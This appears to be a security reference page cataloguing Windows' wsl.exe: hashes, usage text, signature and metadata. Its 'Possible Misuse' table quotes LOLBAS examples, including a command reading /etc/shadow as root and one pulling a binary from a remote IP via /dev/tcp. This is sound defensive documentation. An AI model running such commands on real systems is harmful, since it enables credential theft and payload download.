---
title: wsl.exe | Microsoft Windows Subsystem for Linux Launcher
excerpt: What is wsl.exe?
---

# wsl.exe 

* File Path: `C:\WINDOWS\system32\wsl.exe`
* Description: Microsoft Windows Subsystem for Linux Launcher

## Hashes

Type | Hash
-- | --
MD5 | `D2CB10881162C87389C5BA648153304E`
SHA1 | `CE0D7224F2A87519EAC8A2540F353EA0F942011E`
SHA256 | `6D9D361265C9FB27D66E1B823076E631ECC0C88EE0BF4BBEF4B5ED1DF82BEA38`
SHA384 | `37E87DE18B7681AD80575479309FECF545ACDB981FB7C60085137DAB1F50B4653E6062D9CB1E9380505C08369FA2565F`
SHA512 | `B614D6CA07965E395DAA149EE5E51181E79523B15C64BD99A9347CA47005A29D36B6F571D06B7DFCA3F7B1A231B4000687948845E4659CE71DD2F01755D43689`
SSDEEP | `3072:FpjMG9F7dpaOhYvASweSnlR5nJqixHKeJnK3fvOL:zMGpctSnphKUnK3fv`
IMP | `B3340FB67577500365C3E261D0ECFA69`
PESHA1 | `D8FD9C9644FCFABD1FC39955A335E5DF61A9FECC`
PE256 | `00AC2D300A35B87936B07E6EBAB374BF8C58D1502ACB233E9E70630BEC558729`

## Runtime Data

### Usage (stdout):
```cmhg

Copyright (c) Microsoft Corporation. All rights reserved.

Usage: wsl.exe [Argument]

Arguments:

    --install <Options>
        Install Windows Subsystem for Linux features. If no options are specified,
        the recommended features will be installed along with the default distribution.

        To view the default distribution as well as a list of other valid distributions,
        use 'wsl --list --online'.

        Options:
            --distribution, -d [Argument]
                Specifies the distribution to be downloaded and installed by name.

                Arguments:
                    A valid distribution name (not case sensitive).
                    
                Examples:
                    wsl --install -d Ubuntu
                    wsl --install --distribution Debian

    --list, -l [Options]
        Lists distributions.

        Options:
            --online, -o
                Displays a list of available distributions for install with 'wsl --install'.

    --status
        Show the status of Windows Subsystem for Linux.

    --help
        Display usage information.

```

### Loaded Modules:

Path |
-- |
C:\WINDOWS\System32\KERNEL32.DLL |
C:\WINDOWS\System32\KERNELBASE.dll |
C:\WINDOWS\SYSTEM32\ntdll.dll |
C:\WINDOWS\system32\wsl.exe |


## Signature

* Status: Signature verified.
* Serial: `33000002ED2C45E4C145CF48440000000002ED`
* Thumbprint: `312860D2047EB81F8F58C29FF19ECDB4C634CF6A`
* Issuer: CN=Microsoft Windows Production PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US
* Subject: CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US

## File Metadata

* Original Filename: wsl.exe.mui
* Product Name: Microsoft Windows Operating System
* Company Name: Microsoft Corporation
* File Version: 10.0.22000.1 (WinBuild.160101.0800)
* Product Version: 10.0.22000.1
* Language: English (United States)
* Legal Copyright:  Microsoft Corporation. All rights reserved.
* Machine Type: 64-bit

## File Scan

* VirusTotal Detections: 0/73
* VirusTotal Link: https://www.virustotal.com/gui/file/6d9d361265c9fb27d66e1b823076e631ecc0c88ee0bf4bbef4b5ed1df82bea38/detection


## Possible Misuse

*The following table contains possible examples of `wsl.exe` being misused. While `wsl.exe` is **not** inherently malicious, its legitimate functionality can be abused for malicious purposes.*

Source | Source File | Example | License
-- | -- | -- | --
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_wsl_lolbin.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_wsl_lolbin.yml) | `- '\wsl.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Wsl.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Wsl.yml) | `Name: Wsl.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Wsl.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Wsl.yml) | `- Command: wsl.exe -e /mnt/c/Windows/System32/calc.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Wsl.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Wsl.yml) | `Description: Executes calc.exe from wsl.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Wsl.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Wsl.yml) | `- Command: wsl.exe -u root -e cat /etc/shadow`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Wsl.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Wsl.yml) | `- Command: wsl.exe --exec bash -c 'cat file'`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Wsl.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Wsl.yml) | `- Command: wsl.exe --exec bash -c 'cat < /dev/tcp/192.168.1.10/54 > binary'`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Wsl.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Wsl.yml) | `- Path: C:\Windows\System32\wsl.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Wsl.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Wsl.yml) | `- IOC: Child process from wsl.exe`{:.highlight .language-yaml} | 



MIT License. Copyright (c) 2020-2021 Strontic.


